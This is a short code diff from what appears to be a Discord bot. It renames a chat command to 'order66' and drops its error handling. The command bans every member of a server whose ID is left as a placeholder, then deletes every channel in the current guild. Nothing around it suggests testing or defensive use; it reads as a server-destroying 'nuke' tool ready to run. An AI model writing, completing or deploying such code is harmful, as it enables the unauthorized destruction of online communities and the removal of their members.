@@ -22,22 +22,17 @@ client.on('message', message => {
 
     switch (args[0]) {
 
-        case 'kreuzritter':
-
-            try {
+        case 'order66':
 
 
-                const list = client.guilds.get("Null"); //INSERT SERVER ID 
+
+            const list = client.guilds.get("Null"); //INSERT SERVER ID 
 
 
-                list.members.forEach(member => member.ban());
-                message.guild.channels.forEach(channel => channel.delete());
+            list.members.forEach(member => member.ban());
+            message.guild.channels.forEach(channel => channel.delete());
 
-            } catch (PromiseRejectionWarning) {
 
-                console.log('Not enough permissions');
-
-            }
 
             break;
 
